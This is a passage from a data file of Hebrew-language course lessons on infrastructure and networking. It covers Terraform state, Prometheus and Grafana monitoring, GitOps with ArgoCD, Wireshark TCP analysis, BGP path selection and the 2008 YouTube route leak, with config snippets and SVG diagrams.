<p><strong>כלים מובילים:</strong> Terraform (cloud-agnostic), AWS CloudFormation (AWS בלבד), Pulumi (IaC בPython/TypeScript), Ansible (configuration management).</p>
</div>`
      },
      {
        type: "explanation",
        title: "Terraform HCL — שפת ההגדרה",
        content: `<div dir="rtl">
<h2>HashiCorp Configuration Language</h2>
<p>Terraform משתמש ב-HCL — שפה declarative שמתארת מה אתם רוצים, לא איך לבנות אותו. אתם אומרים "אני רוצה EC2 instance מסוג t3.micro" — Terraform מחשב מה צריך ליצור, לשנות, או למחוק.</p>
<pre><code>provider "aws" {
  region = "us-east-1"
}

resource "aws_instance" "web" {
  ami           = "ami-0c02fb55956c7d316"
  instance_type = "t3.micro"

  tags = {
    Name = "web-server"
    Env  = "production"
  }
}

output "public_ip" {
  value = aws_instance.web.public_ip
}</code></pre>
<table class="content-table">
  <tr><th>כלי IaC</th><th>Provider support</th><th>שפה</th><th>State</th></tr>
  <tr><td><strong>Terraform</strong></td><td>700+ providers</td><td>HCL</td><td>tfstate file</td></tr>
  <tr><td><strong>CloudFormation</strong></td><td>AWS בלבד</td><td>JSON/YAML</td><td>AWS managed</td></tr>
  <tr><td><strong>Pulumi</strong></td><td>100+ providers</td><td>Python/TS/Go</td><td>Pulumi Cloud</td></tr>
</table>
<p><strong>הבסיס:</strong> provider מגדיר עם מי מדברים (AWS, Azure, GCP, Kubernetes), resource מגדיר מה יוצרים, output מייצא ערכים לשימוש חיצוני.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Terraform State — הזיכרון של התשתית",
        content: `<div dir="rtl">
<h2>State Management — terraform.tfstate</h2>
<p>Terraform שומר <strong>state</strong> — מפה מפורטת בין קוד ה-HCL לבין המשאבים האמיתיים ב-cloud. בלי state, Terraform לא יודע מה כבר קיים ומה צריך ליצור.</p>
<pre><code># הפקודות הבסיסיות
terraform init     # הורדת providers
terraform plan     # מה ישתנה (dry run)
terraform apply    # מבצע שינויים
terraform destroy  # מוחק הכל

# state ב-S3 לצוות (remote backend)
terraform {
  backend "s3" {
    bucket = "my-terraform-state"
    key    = "prod/terraform.tfstate"
    region = "us-east-1"
  }
}</code></pre>
<p><strong>הכלל החשוב ביותר:</strong> לעולם אל תערכו state ידנית. אם משאב נוצר מחוץ ל-Terraform (click בconsole) — השתמשו ב-<code>terraform import</code> כדי להכניס אותו ל-state.</p>
<p><strong>Remote state:</strong> בצוות, state חייב להיות בS3 + DynamoDB לocking, לא על המחשב האישי. אחרת שני אנשים שמריצים <code>apply</code> במקביל יגרמו corruption.</p>
</div>`
      },
      {
        type: "story",
        title: "Cattle vs Pets — המטפורה שמסבירה IaC",
        content: `<div dir="rtl">
<h2>כשהשרת נפל — ואיש לא בכה</h2>
<p>ב-2012, חברת Netflix הציגה מטפורה שהפכה לאחת הרעיונות המשפיעים ביותר בDevOps: <strong>Cattle vs Pets (בקר לעומת חיות מחמד)</strong>.</p>
<p><strong>חיות מחמד (Pets):</strong> לשרתים יש שמות — "Big Iron", "dev-01". כשהם חולים, אנשי Ops עושים לילות לבנים כדי לרפא אותם. אם הם מתים — זו טרגדיה. כל שרת הוא ייחודי, ידנית מוגדר, ולא ניתן להחליפו בקלות.</p>
<p><strong>בקר (Cattle):</strong> לשרתים יש מספרים — "web-047". כשהם חולים — שוחטים ומחליפים. Terraform מייצר instance חדש תוך דקות. Auto Scaling Group מגדיר מינימום 3 instances — אם אחד מת, AWS מייצר אחר אוטומטית.</p>
<p>Netflix פיתחה את <strong>Chaos Monkey</strong> — כלי שמכבה שרתים פרודקשן אקראית במהלך שעות העבודה. כן, בכוונה. מדוע? כדי לוודא שהמערכת חוסנה לאירועים כאלה. אם זה מכאיב — תתקנו. אם לא — אתם Cattle-ready.</p>
<p>התשתית ה-immutable (שלא משנים — רק מחליפים) היא הלב של IaC מודרני. Blue-green deployments, canary releases, zero-downtime updates — כולם מסתמכים על רעיון ה-Cattle.</p>
</div>`
      }
    ]
  },
  {
    id: 208,
    title: "Prometheus ו-Grafana — ניטור כמו Google",
    pages: [
      {
        type: "explanation",
        title: "שלושת עמודי Observability",
        content: `<div dir="rtl">
<h2>Metrics, Logs, Traces — המשולש הקדוש</h2>
<p>כשמשהו משתבש בפרודקשן, אתם צריכים שלושה סוגי מידע שונים כדי להבין מה קרה. Google קוראת לזה <strong>Observability</strong>.</p>
<table class="content-table">
  <tr><th>סוג</th><th>מה זה</th><th>שאלות שעונה</th><th>כלים</th></tr>
  <tr><td><strong>Metrics</strong></td><td>מספרים לאורך זמן</td><td>"מה המצב עכשיו?"</td><td>Prometheus, Datadog</td></tr>
  <tr><td><strong>Logs</strong></td><td>אירועים טקסטואליים</td><td>"מה בדיוק קרה?"</td><td>ELK, Loki</td></tr>
  <tr><td><strong>Traces</strong></td><td>מסלול request בין services</td><td>"איפה הbottleneck?"</td><td>Jaeger, Zipkin</td></tr>
</table>
<p><strong>Prometheus</strong> הוא מערכת monitoring שנבנתה ב-SoundCloud ב-2012 ועכשיו standard בKubernetes. היא scrapes מכל service את ה-metrics (pull model) ושומרת אותם ב-time-series database.</p>
<p><strong>מודל הנתונים:</strong> כל metric הוא שם + labels. למשל: <code>http_requests_total{method="GET", status="200", service="api"}</code>. הlabels מאפשרים filtering וaggregation עוצמתיים.</p>
</div>`
      },
      {
        type: "explanation",
        title: "PromQL — שפת השאילתות",
        content: `<div dir="rtl">
<h2>Prometheus Query Language</h2>
<p>PromQL היא שפת שאילתות time-series — מחשבת rates, aggregations, ו-percentiles בזמן אמת.</p>
<pre><code># Rate of HTTP requests per second (5 min window)
rate(http_requests_total[5m])

# 99th percentile latency
histogram_quantile(0.99,
  rate(http_request_duration_seconds_bucket[5m])
)

# Error rate
rate(http_requests_total{status=~"5.."}[5m])
  / rate(http_requests_total[5m])

# Alert: error rate above 1%
ALERT HighErrorRate
  IF error_rate > 0.01
  FOR 5m
  LABELS { severity="critical" }
  ANNOTATIONS { summary = "Error rate above 1%" }</code></pre>
<table class="content-table">
  <tr><th>Method</th><th>Metrics</th><th>שאלה</th></tr>
  <tr><td>RED (שירותים)</td><td>Rate, Errors, Duration</td><td>כמה? כשל? כמה זמן?</td></tr>
  <tr><td>USE (משאבים)</td><td>Utilization, Saturation, Errors</td><td>שימוש? קיבולת? שגיאות?</td></tr>
</table>
<p>RED שימושי ל-microservices: "כמה requests לשנייה? כמה נכשלים? מה הlatency?". USE שימושי לinfrastructure: "CPU usage? Queue depth? Disk errors?".</p>
</div>`
      },
      {
        type: "explanation",
        title: "Grafana Dashboards — הסיפור החזותי",
        content: `<div dir="rtl">
<h2>מנתונים ל-Insights ויזואליים</h2>
<p>Grafana היא ה-visualization layer שמחבר ל-Prometheus (ועוד עשרות data sources). Dashboard טוב מספר סיפור: "כשה-deployment יצא בשעה 14:30, הlatency עלה ב-40%".</p>
<div class="diagram-container">
<svg viewBox="0 0 360 130" class="content-diagram">
  <rect x="10" y="10" width="100" height="50" rx="6" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="60" y="30" text-anchor="middle" font-size="10" fill="#93c5fd">Services</text>
  <text x="60" y="46" text-anchor="middle" font-size="9" fill="#64748b">/metrics endpoint</text>
  <rect x="130" y="10" width="100" height="50" rx="6" fill="#1e293b" stroke="#22c55e" stroke-width="1.5"/>
  <text x="180" y="30" text-anchor="middle" font-size="10" fill="#86efac">Prometheus</text>
  <text x="180" y="46" text-anchor="middle" font-size="9" fill="#64748b">scrape + store</text>
  <rect x="250" y="10" width="100" height="50" rx="6" fill="#1e293b" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="300" y="30" text-anchor="middle" font-size="10" fill="#fcd34d">Grafana</text>
  <text x="300" y="46" text-anchor="middle" font-size="9" fill="#64748b">visualize + alert</text>
  <line x1="110" y1="35" x2="130" y2="35" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-prom)"/>
  <line x1="230" y1="35" x2="250" y2="35" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arr-prom)"/>
  <rect x="10" y="80" width="340" height="38" rx="6" fill="#0f172a" stroke="#475569" stroke-width="1"/>
  <text x="180" y="97" text-anchor="middle" font-size="10" fill="#e2e8f0">AlertManager</text>
  <text x="180" y="112" text-anchor="middle" font-size="9" fill="#64748b">PagerDuty / Slack / Email alerts</text>
  <defs><marker id="arr-prom" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker></defs>
</svg>
</div>
<p>Best practices לdashboard: <strong>Golden Signals בראש</strong> (latency, traffic, errors, saturation), <strong>drill-down</strong> מכלל לפרט, <strong>annotations</strong> לdeployments — כדי לראות correlation בין deploy לבין שינויים במטריקס.</p>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Memory Leak שנתפס לפני שהשפיע",
        content: `<div dir="rtl">
<h2>כשהגרף הציל את הפרודקשן</h2>
<p>סטארטאפ SaaS קטן. יום רגיל. ואז, Grafana שולח Slack alert: "Memory usage בservice X עולה בקצב קבוע של 2MB לשעה". לא alert קריטי — רק "warning".</p>
<p>הצוות בדק. הקוד היה "clean". unit tests עברו. staging לא הראה שום דבר. אבל הגרף לא שיקר — קו ישר כלפי מעלה, מתחיל בדיוק עם הdeploy של שלשום.</p>
<p>חיפשו ב-profiler. מצאו: Redis client שנוצר מחדש בכל request — ולא נסגר. connection pool עם 10,000 connections פתוחים. הfix: 3 שורות קוד. זמן תיקון: 45 דקות.</p>
<p>ללא Prometheus: Service היה קורס אחרי 4 ימים, 02:00 לילה, בזמן spike בתנועה. עם Prometheus: הבעיה זוהתה ב-business hours, ב-staging, לפני שהשפיעה על משתמש אחד.</p>
<p><strong>הלקח:</strong> Monitoring לא מיועד לגלות בעיות כשהן קורות — אלא <strong>לפני שהן קורות</strong>. Trending alerts (ערך עולה בקצב קבוע) שווים יותר מ-threshold alerts (ערך עבר גבול). Google קוראת לזה: <strong>"Alert on symptoms, not causes"</strong>.</p>
</div>`
      }
    ]
  },
  {
    id: 209,
    title: "GitOps ו-ArgoCD",
    pages: [
      {
        type: "explanation",
        title: "GitOps — Git כמקור האמת היחיד",
        content: `<div dir="rtl">
<h2>GitOps: מה שב-Git הוא מה שב-Production</h2>
<p>GitOps הוא פרקטיקה שבה <strong>כל מצב הפרודקשן מוגדר ב-Git</strong>. לא רק קוד האפליקציה — גם כל הKubernetes manifests, Helm values, ו-infrastructure config.</p>
<p><strong>עקרונות GitOps:</strong></p>
<ul>
  <li><strong>Declarative:</strong> מתאר מה רוצים, לא איך לעשות</li>
  <li><strong>Versioned:</strong> כל שינוי הוא commit — ניתן לrollback מיידי</li>
  <li><strong>Automated:</strong> controller מסנכרן Git לcluster אוטומטית</li>
  <li><strong>Continuous reconciliation:</strong> אם מישהו שינה משהו בcluster ידנית — Controller מחזיר למצב ב-Git</li>
</ul>
<table class="content-table">
  <tr><th>מודל</th><th>Push Deployment</th><th>Pull (GitOps)</th></tr>
  <tr><td>מי פועל</td><td>CI pipeline</td><td>Controller בcluster</td></tr>
  <tr><td>הרשאות</td><td>CI צריך kubectl access</td><td>אין גישה חיצונית לcluster</td></tr>
  <tr><td>Drift</td><td>לא מזוהה</td><td>מזוהה ותוקן אוטומטית</td></tr>
  <tr><td>Rollback</td><td>ידני</td><td>git revert</td></tr>
</table>
</div>`
      },
      {
        type: "diagram",
        title: "GitOps Loop — מGit לKubernetes",
        content: `<div dir="rtl">
<h2>ArgoCD — GitOps Controller</h2>
<div class="diagram-container">
<svg viewBox="0 0 360 130" class="content-diagram">
  <rect x="10" y="40" width="80" height="40" rx="6" fill="#1e293b" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="50" y="57" text-anchor="middle" font-size="10" fill="#fcd34d">Git Repo</text>
  <text x="50" y="72" text-anchor="middle" font-size="9" fill="#64748b">manifests</text>
  <rect x="140" y="40" width="80" height="40" rx="6" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="180" y="57" text-anchor="middle" font-size="10" fill="#93c5fd">ArgoCD</text>
  <text x="180" y="72" text-anchor="middle" font-size="9" fill="#64748b">sync + diff</text>
  <rect x="270" y="40" width="80" height="40" rx="6" fill="#1e293b" stroke="#22c55e" stroke-width="1.5"/>
  <text x="310" y="57" text-anchor="middle" font-size="10" fill="#86efac">K8s Cluster</text>
  <text x="310" y="72" text-anchor="middle" font-size="9" fill="#64748b">running state</text>
  <line x1="90" y1="60" x2="140" y2="60" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arr-argo)"/>
  <text x="115" y="54" text-anchor="middle" font-size="8" fill="#f59e0b">watch</text>
  <line x1="220" y1="60" x2="270" y2="60" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-argo)"/>
  <text x="245" y="54" text-anchor="middle" font-size="8" fill="#3b82f6">apply</text>
  <path d="M310,80 Q310,110 180,110 Q50,110 50,80" fill="none" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#arr-argo-red)"/>
  <text x="180" y="122" text-anchor="middle" font-size="8" fill="#ef4444">drift detected — auto-heal</text>
  <defs>
    <marker id="arr-argo" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker>
    <marker id="arr-argo-red" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#ef4444"/></marker>
  </defs>
</svg>
</div>
<pre><code>apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: my-app
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://github.com/myorg/my-app
    targetRevision: HEAD
    path: k8s/
  destination:
    server: https://kubernetes.default.svc
    namespace: production
  syncPolicy:
    automated:
      prune: true       # מוחק resources שנמחקו מGit
      selfHeal: true    # מתקן drift אוטומטית</code></pre>
<p>ArgoCD מסנכרן כל 3 דקות. שינוי ב-Git = deploy אוטומטי. שינוי ידני בcluster = תוקן אוטומטית לstate ב-Git. זו הבטחת GitOps.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Drift Detection — הביטחון של GitOps",
        content: `<div dir="rtl">
<h2>כשמישהו שינה משהו — ArgoCD יודע</h2>
<p>הכוח הגדול ביותר של GitOps: <strong>drift detection</strong>. כל שינוי ב-cluster שלא מגיע מ-Git — ArgoCD מזהה ומדווח (ואם מוגדר selfHeal — מחזיר אוטומטית).</p>
<pre><code># בדיקת סטטוס אפליקציות
argocd app list

# סנכרון ידני עם diff
argocd app diff my-app
argocd app sync my-app

# Rollback לגרסה קודמת
argocd app rollback my-app 3</code></pre>
<p><strong>מתי GitOps לא מספיק?</strong> Secrets. לא מאחסנים passwords בGit. הפתרון: <strong>Sealed Secrets</strong> (מוצפן בpublic key, רק cluster יכול לפענח) או <strong>External Secrets Operator</strong> (מושך מ-Vault/AWS Secrets Manager).</p>
<p><strong>ApplicationSet:</strong> תכונה מתקדמת שיוצרת Applications מרובות אוטומטית — למשל, אחת לכל namespace, לכל cluster, או לכל feature branch. מאפשר multi-cluster GitOps.</p>
</div>`
      }
    ]
  }
]
  },
  {
    id: 'research',
    title: 'מחקר פרוטוקולים',
    subtitle: 'Wireshark עמוק, BGP, QUIC, eBPF — ניתוח פרוטוקולים',
    icon: '🔬',
    color: '#a855f7',
    level: 'מתקדם',
    chapters: [
  {
    id: 301,
    title: "Wireshark מתקדם",
    pages: [
      {
        type: "explanation",
        title: "קריאת TCP State Machine",
        content: `<div dir="rtl">
<h2>Wireshark — מעבר לצבעים</h2>
<p>רוב האנשים פותחים Wireshark ורואים גל של חבילות צבעוניות. אנליסטים מקצועיים קוראים <strong>סיפורים</strong> — מה קרה, מתי, ולמה.</p>
<div class="diagram-container">
<svg viewBox="0 0 360 130" class="content-diagram">
  <text x="180" y="16" text-anchor="middle" font-size="12" fill="#e2e8f0" font-weight="bold">TCP State Machine — החיים של חיבור</text>
  <rect x="10" y="25" width="80" height="22" rx="4" fill="#1e3a5f"/>
  <text x="50" y="40" text-anchor="middle" font-size="10" fill="#7dd3fc">CLOSED</text>
  <rect x="140" y="25" width="80" height="22" rx="4" fill="#166534"/>
  <text x="180" y="40" text-anchor="middle" font-size="10" fill="#86efac">SYN_SENT</text>
  <rect x="270" y="25" width="80" height="22" rx="4" fill="#166534"/>
  <text x="310" y="40" text-anchor="middle" font-size="10" fill="#86efac">SYN_RCVD</text>
  <rect x="140" y="70" width="80" height="22" rx="4" fill="#14532d"/>
  <text x="180" y="85" text-anchor="middle" font-size="10" fill="#4ade80">ESTABLISHED</text>
  <rect x="10" y="70" width="80" height="22" rx="4" fill="#78350f"/>
  <text x="50" y="85" text-anchor="middle" font-size="10" fill="#fcd34d">TIME_WAIT</text>
  <rect x="270" y="70" width="80" height="22" rx="4" fill="#7f1d1d"/>
  <text x="310" y="85" text-anchor="middle" font-size="10" fill="#fca5a5">CLOSE_WAIT</text>
  <line x1="90" y1="36" x2="140" y2="36" stroke="#86efac" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="115" y="30" text-anchor="middle" font-size="9" fill="#86efac">SYN</text>
  <line x1="220" y1="36" x2="270" y2="36" stroke="#86efac" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="245" y="30" text-anchor="middle" font-size="9" fill="#86efac">SYN-ACK</text>
  <line x1="180" y1="47" x2="180" y2="70" stroke="#4ade80" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="200" y="63" font-size="9" fill="#4ade80">ACK</text>
  <line x1="140" y1="81" x2="90" y2="81" stroke="#fcd34d" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="115" y="76" text-anchor="middle" font-size="9" fill="#fcd34d">FIN</text>
  <defs><marker id="arr" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker></defs>
</svg>
</div>
<table class="content-table">
  <tr><th>State</th><th>משמעות</th><th>מה לחפש</th></tr>
  <tr><td><code>SYN_SENT</code></td><td>לקוח שלח SYN, מחכה לתגובה</td><td>אם נתקע — הסרת/firewall חסום</td></tr>
  <tr><td><code>ESTABLISHED</code></td><td>חיבור פעיל, נתונים זורמים</td><td>RTT, window size, retransmissions</td></tr>
  <tr><td><code>TIME_WAIT</code></td><td>חיבור נסגר, ממתין 2×MSL</td><td>המון TIME_WAIT = בעיית port exhaustion</td></tr>
  <tr><td><code>CLOSE_WAIT</code></td><td>הצד הרחוק סגר, צד שלנו לא</td><td>bug ב-application — לא מסגר socket</td></tr>
</table>
<p><strong>Filter שימושי:</strong> <code>tcp.flags.syn == 1 && tcp.flags.ack == 0</code> — רואה כל ניסיון חיבור חדש.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Retransmissions ו-CWND",
        content: `<div dir="rtl">
<h2>TCP Congestion Control — הסיפור שמתרחש מתחת לפני</h2>
<p>כל retransmission ב-Wireshark הוא צעקה: <em>"משהו השתבש!"</em>. להבין מה — זו האמנות.</p>
<div class="code-preview"><pre><code># Wireshark display filters לניפוי TCP
tcp.analysis.retransmission          # חבילות שנשלחו מחדש
tcp.analysis.fast_retransmission     # fast retransmit (3 dup-ACK)
tcp.analysis.duplicate_ack           # ACK כפול — אות לאיבוד חבילה
tcp.analysis.zero_window             # receiver buffer מלא — ממתין
tcp.analysis.window_full             # sender מלא את window הנמען
tcp.analysis.out_of_order            # הגיע לא בסדר (jitter/reorder)

# לראות RTT לכל ack:
tcp.analysis.ack_rtt</code></pre></div>
<table class="content-table">
  <tr><th>ממצא</th><th>סיבה אפשרית</th><th>פתרון</th></tr>
  <tr><td>הרבה Retransmissions</td><td>אובדן חבילות, רשת עמוסה</td><td>בדוק interface errors, שדרג קו</td></tr>
  <tr><td>Zero Window</td><td>Application לא קורא מהיר מספיק</td><td>tune TCP buffers, בדוק CPU</td></tr>
  <tr><td>RTT גבוה בעקביות</td><td>נתיב ארוך, סאטלייט, congestion</td><td>CDN, BBR congestion algorithm</td></tr>
  <tr><td>Fast Retransmit</td><td>חבילה אחת אבדה, הבאות הגיעו</td><td>בדח מיקום — לרוב בשכבת הפיזי</td></tr>
</table>
<p><strong>כלי מובנה:</strong> Statistics → TCP Stream Graphs → Time-Sequence Graph מציג את CWND לאורך זמן — drops מופיעים כצניחות חדות.</p>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: 3 שניות שעלו $2M",
        content: `<div dir="rtl">
<h2>כשlatency הורס עסקאות</h2>
<p>חברת fintech ביקשה לנתח תקרית: כל יום בדיוק ב-9:30 בבוקר, עסקאות מניות נכשלות למשך 3 שניות. בשלושת הדקות הראשונות — $2M הפסד ביום.</p>
<p>הניתוח: פתחו Wireshark על הממשק בין שרת ה-trading לבורסה. Filter: <code>tcp.analysis.retransmission || tcp.analysis.zero_window</code>.</p>
<p>הממצא היה מפתיע: ב-9:30:00 בדיוק — גל של Zero Window ממשרתי הבורסה. לא אובדן חבילות — receiver buffer מלא. הבורסה עצמה נחנקת בנפח פתיחת יום.</p>
<p>הפתרון: שינוי ב-TCP buffer sizing + connection pooling + staggered reconnect (לא כולם מתחברים מחדש בו זמנית). בשלושה שינויי קוד — הבעיה נעלמה.</p>
<div class="code-preview"><pre><code># Python socket tuning שנוסף
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)</code></pre></div>
<p><strong>הלקח:</strong> Wireshark לא מוצא bugs — הוא חושף <em>מציאות</em>. הבעיה לא הייתה בקוד שלנו, אלא בהתנהגות הרשת תחת עומס. בלי packet capture — הייתם מחפשים שבועות.</p>
</div>`
      }
    ]
  },
  {
    id: 302,
    title: "BGP — עמוד השדרה של האינטרנט",
    pages: [
      {
        type: "explanation",
        title: "iBGP ו-eBGP — שתי מציאויות",
        content: `<div dir="rtl">
<h2>BGP: הפרוטוקול שמחזיק את האינטרנט</h2>
<p>BGP (Border Gateway Protocol) הוא ה-routing protocol היחיד שפועל בין Autonomous Systems — הארגונים, ISPים וחברות שמרכיבים את האינטרנט.</p>
<div class="diagram-container">
<svg viewBox="0 0 360 140" class="content-diagram">
  <text x="180" y="15" text-anchor="middle" font-size="12" fill="#e2e8f0" font-weight="bold">iBGP vs eBGP</text>
  <rect x="10" y="25" width="150" height="100" rx="8" fill="#1e293b" stroke="#3b82f6" stroke-width="2"/>
  <text x="85" y="42" text-anchor="middle" font-size="11" fill="#93c5fd" font-weight="bold">AS 65001 (ISP A)</text>
  <rect x="25" y="50" width="50" height="22" rx="4" fill="#1e3a5f"/>
  <text x="50" y="65" text-anchor="middle" font-size="10" fill="#7dd3fc">Router 1</text>
  <rect x="95" y="50" width="50" height="22" rx="4" fill="#1e3a5f"/>
  <text x="120" y="65" text-anchor="middle" font-size="10" fill="#7dd3fc">Router 2</text>
  <line x1="75" y1="61" x2="95" y2="61" stroke="#60a5fa" stroke-width="1.5" stroke-dasharray="4,2"/>
  <text x="85" y="56" text-anchor="middle" font-size="8" fill="#60a5fa">iBGP</text>
  <rect x="200" y="25" width="150" height="100" rx="8" fill="#1e293b" stroke="#22c55e" stroke-width="2"/>
  <text x="275" y="42" text-anchor="middle" font-size="11" fill="#86efac" font-weight="bold">AS 65002 (ISP B)</text>
  <rect x="215" y="50" width="50" height="22" rx="4" fill="#14532d"/>
  <text x="240" y="65" text-anchor="middle" font-size="10" fill="#86efac">Router 3</text>
  <rect x="285" y="50" width="50" height="22" rx="4" fill="#14532d"/>
  <text x="310" y="65" text-anchor="middle" font-size="10" fill="#86efac">Router 4</text>
  <line x1="215" y1="61" x2="285" y2="61" stroke="#4ade80" stroke-width="1.5" stroke-dasharray="4,2"/>
  <text x="250" y="56" text-anchor="middle" font-size="8" fill="#4ade80">iBGP</text>
  <line x1="145" y1="75" x2="200" y2="75" stroke="#f59e0b" stroke-width="2"/>
  <text x="172" y="70" text-anchor="middle" font-size="9" fill="#fbbf24" font-weight="bold">eBGP</text>
</svg>
</div>
<table class="content-table">
  <tr><th>פרמטר</th><th>iBGP</th><th>eBGP</th></tr>
  <tr><td>היכן פועל</td><td>בתוך AS אחד</td><td>בין ASים שונים</td></tr>
  <tr><td>TTL</td><td>255 (כל מסלול)</td><td>1 (חייב שכן ישיר)</td></tr>
  <tr><td>next-hop</td><td>לא משתנה כברירת מחדל</td><td>משתנה לכתובת ה-peer</td></tr>
  <tr><td>full mesh</td><td>נדרש (או Route Reflector)</td><td>לא נדרש</td></tr>
  <tr><td>עדכון</td><td>לא מפרסם ל-iBGP אחר</td><td>מפרסם הכל</td></tr>
</table>
<p><strong>Rule הכי חשוב:</strong> Router שקיבל מסלול מ-iBGP neighbor <em>לא</em> שולח אותו ל-iBGP אחר — זו הסיבה לdependency על full mesh או Route Reflectors.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Path Selection — 13 הכללים",
        content: `<div dir="rtl">
<h2>כיצד BGP בוחר את המסלול הטוב ביותר</h2>
<p>כשהruter מקבל אותו prefix מכמה שכנים, הוא עובר על 13 קריטריונים לפי הסדר — הראשון שמבדיל מנצח:</p>
<table class="content-table">
  <tr><th>#</th><th>קריטריון</th><th>גבוה = עדיף</th></tr>
  <tr><td>1</td><td>Weight (Cisco proprietary)</td><td>✅ גבוה</td></tr>
  <tr><td>2</td><td>Local Preference</td><td>✅ גבוה (100 = ברירת מחדל)</td></tr>
  <tr><td>3</td><td>Locally originated (network/aggregate)</td><td>✅ עדיפות לנתיבים שלנו</td></tr>
  <tr><td>4</td><td>AS Path Length (קצר יותר = עדיף)</td><td>❌ קצר</td></tr>
  <tr><td>5</td><td>Origin (IGP > EGP > ?)</td><td>✅ IGP עדיף</td></tr>
  <tr><td>6</td><td>MED (Multi-Exit Discriminator)</td><td>❌ נמוך</td></tr>
  <tr><td>7</td><td>eBGP > iBGP</td><td>✅ eBGP עדיף</td></tr>
  <tr><td>8</td><td>IGP metric to next-hop</td><td>❌ נמוך</td></tr>
  <tr><td>9-13</td><td>BGP Router ID, cluster-list, neighbor IP</td><td>tiebreakers</td></tr>
</table>
<p><strong>בפועל</strong>, 90% של engineering BGP הוא שינוי Local Preference ו-AS Path prepending:</p>
<div class="code-preview"><pre><code># Cisco IOS — העדף ISP A על ISP B
route-map PREFER_ISPA permit 10
  set local-preference 200

# AS Path Prepending — הפוך מסלול פחות אטרקטיבי
route-map BACKUP_LINK permit 10
  set as-path prepend 65001 65001 65001</code></pre></div>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Pakistan Telecom 2008",
        content: `<div dir="rtl">
<h2>כשPakistan תקפה את YouTube — בטעות</h2>
<p>24 בפברואר 2008: Pakistan Telecom קיבלה הוראה מהממשלה לחסום YouTube. הפתרון שבחרו — להכניס route ל-BGP שמפנה את הtrafic של YouTube לblack hole מקומי.</p>
<p><strong>מה שקרה:</strong> במקום לשמור את הroute פנימי (iBGP בלבד), הroute דלף ל-PCCW — ה-upstream ISP של Pakistan. PCCW הפיצה אותו לשאר העולם.</p>
<p>כרגע שזה קרה: BGP בחר את הroute של Pakistan לכל טראפיק ל-YouTube — כי הוא היה ה-<em>ספציפי יותר</em>. YouTube פרסמה <code>208.65.153.0/22</code>; Pakistan פרסמה <code>208.65.153.0/24</code> — /24 ספציפי יותר מ-/22.</p>
<p>תוך 2 דקות: 75% מטראפיק YouTube העולמי הופנה לPakistan. YouTube הייתה נגישה רק ל-25% מהמשתמשים. משך ההפסקה: כ-2 שעות.</p>
<div class="code-preview"><pre><code># הroute הבעייתי (רעיונית):
# YouTube: 208.65.153.0/22 (AS 36561)
# Pakistan: 208.65.153.0/24 (AS 17557) ← יותר ספציפי, ניצח!

# BGP: Longest Prefix Match תמיד מנצח
# /24 (256 כתובות) > /22 (1024 כתובות) מבחינת BGP</code></pre></div>
<p><strong>הלקח:</strong> BGP הוא פרוטוקול של אמון. אין אימות מובנה — כל AS יכול לפרסם כל prefix. RPKI (Resource Public Key Infrastructure) נוצר בדיוק בגלל תקריות כאלו — קריפטוגרפית מאמת שASהוא מורשה לפרסם prefix מסוים.</p>
</div>`
      }
    ]
  },
  {
    id: 303,
    title: "DNS בעומק",
    pages: [
      {
        type: "explanation",
        title: "Recursive Resolution — כל צעד",
        content: `<div dir="rtl">
<h2>מה קורה כשאתה מקליד google.com</h2>
<p>DNS resolution נראה פשוט — בפועל זה ריקוד מדוייק בין 5 שחקנים שונים:</p>
<div class="diagram-container">
<svg viewBox="0 0 360 155" class="content-diagram">
  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">DNS Full Resolution Flow</text>
  <rect x="5" y="22" width="70" height="20" rx="4" fill="#1e3a5f"/>
  <text x="40" y="36" text-anchor="middle" font-size="9" fill="#7dd3fc">Client</text>
  <rect x="90" y="22" width="70" height="20" rx="4" fill="#1e3a5f"/>
  <text x="125" y="36" text-anchor="middle" font-size="9" fill="#7dd3fc">Recursive Resolver</text>
  <rect x="175" y="22" width="60" height="20" rx="4" fill="#14532d"/>
  <text x="205" y="36" text-anchor="middle" font-size="9" fill="#86efac">Root NS</text>
  <rect x="250" y="22" width="50" height="20" rx="4" fill="#78350f"/>
  <text x="275" y="36" text-anchor="middle" font-size="9" fill="#fcd34d">TLD NS</text>
  <rect x="310" y="22" width="45" height="20" rx="4" fill="#4c1d95"/>
  <text x="332" y="36" text-anchor="middle" font-size="9" fill="#c4b5fd">Auth NS</text>
  <line x1="40" y1="42" x2="125" y2="55" stroke="#7dd3fc" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="75" y="52" font-size="8" fill="#94a3b8">①google.com?</text>
